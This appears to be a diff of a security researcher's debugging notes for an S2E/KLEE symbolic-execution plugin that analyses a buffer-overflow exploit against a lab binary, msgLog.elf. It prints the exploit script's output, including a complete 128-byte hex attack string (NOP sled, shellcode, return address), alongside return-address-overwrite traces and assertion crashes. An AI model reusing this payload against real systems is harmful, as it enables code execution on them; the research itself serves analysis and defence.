@@ -7791,7 +7791,7 @@ Klee::Executor.h::Cell& getDestCell(ExecutionState &, KInstruction *target) { re
 
 
 
-
+# what the exploited output looks like:
 [s2e@s2e:~/s2e/dasos/LoadingBinaries]$ ./msgLog.elf 
 1
 2
@@ -7803,10 +7803,11 @@ Klee::Executor.h::Cell& getDestCell(ExecutionState &, KInstruction *target) { re
 3
 4
 5
+# this is where all the forking happens
 6
 Hello, world!
 
-
+# what the exploiter's output looks like:
 [s2e@s2e:~/s2e/dasos/LoadingBinaries]$ ./msgLog-exploit.py 
 Imported 68B long shell
 Connecting
@@ -7820,7 +7821,48 @@ Secret in little endian: 1c9af7bf
 Attack string, 128B: 90909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090dad4b892ba1e5cd97424f45b29c9b10b83c30431431403438658ebb7b5c5258809f174d32acba451a3e6c926bab304c654ab68385b64f2abcf1ad013788a5a38e27591cd1c9af7bf00
 Sent
 
-82 [State 142] @0x08048b10, re-entered buffer range after 0 OoB insns; last OoB insn @0xb7603a7e, disasm in debug.
-KLEE: WARNING: silently concretizing (reason: memory access from concrete code) expression (Add w8 (w8 144) (Read w8 0 v15_netwIn0000_15)) to value 144 (:0)
+
+# when ran in s2e, it puts: 12345673456 and you can see the nops run in debug.txt, but then it shows:
 qemu: /mnt/RJFDasos/s2e/build/llvm-2.6/include/llvm/Support/Casting.h:199: typename llvm::cast_retty<To, From>::ret_type llvm::cast(const Y&) [with X = klee::ConstantExpr, Y = klee::ref<klee::Expr>]: Assertion `isa<X>(Val) && "cast<Ty>() argument of incompatible type!"' failed.
 make: *** [/home/s2e/s2e/dasos/mk.stamps/mk.run] Aborted (core dumped)
+
+The above happens due to:
+bool CodeXt::isRetInsn (S2EExecutionState* state, uint64_t pc) {
+	if (cast<klee::ConstantExpr>(read8 (state, pc, false) )->getZExtValue (8) == 0xc3) {
+		return true;
+	}
+	return false;	
+} // end fn isRetInsn
+
+
+
+
+You can see the retaddr being overwritten though:
+Snippit of debug output: (this means that EIP is set to the 4B that start at netwIn[123], where netwIn is the array of bytes read in from the network and marked symbolic)
+>> oEIS pc: 0x08048b11 symb
+ >> oEIS pc: 0x08048b11:0x08048b11 is a ret
+ >> enforceConcreteRetAddr: changed symbolic retaddr ((Concat w32 (Add w8 (w8 191) (Read w8 0 v141_netwIn0126_141))
+            (Concat w24 (Add w8 (w8 168) (Read w8 0 v140_netwIn0125_140))
+                        (Concat w16 (Add w8 (w8 25) (Read w8 0 v139_netwIn0124_139))
+                                    (Add w8 (w8 140) (Read w8 0 v138_netwIn0123_138)))))) to concrete retaddr: 0xbfa8198c
+ >> oEIS pc: 0x08048b11:0x08048b11 just fixed a symb ret address
+ >> monitorRegister _ESP word value inside is 0xbfa8196c
+Word value pointed to by register _ESP is: 0xbfa8198c
+
+
+Fixed ret issue, now:
+qemu: /mnt/RJFDasos/s2e/build/../s2e/klee/include/klee/util/Ref.h:100: int klee::ref<T>::compare(const klee::ref<T>&) const [with T = klee::Expr]: Assertion `!isNull() && !rhs.isNull() && "Invalid call to compare()"' failed.
+
+	struct ConstraintExpr c_e = getConstraint (newConditions[0]);
+	klee::ref<klee::Expr> solved_expr = scrubLabels (newStates[0], c_e.symb);
+
+	if ((c_e.eq && c_e.conc == solved_expr) || (!c_e.eq && c_e.conc != solved_expr) ) {
+
+#3  0x00000000006a3165 in klee::ref<klee::Expr>::compare(klee::ref<klee::Expr> const&) const ()
+#4  0x00000000006a3179 in klee::ref<klee::Expr>::operator==(klee::ref<klee::Expr> const&) const ()
+#5  0x000000000068dcbe in s2e::plugins::CodeXt::onStateFork (this=0x301dac0, state=<value optimized out>, newStates=..., newConditions=...) at /mnt/RJFDasos/s2e/s2e/qemu/s2e/Plugins/CodeXt.cpp:3415
+
+#one of the sides is null
+oSF: clearing both states' constraints
+ >> isConstraint cond wasn't an Eq: Ult
+!! ERROR: scrubLabels: null expression
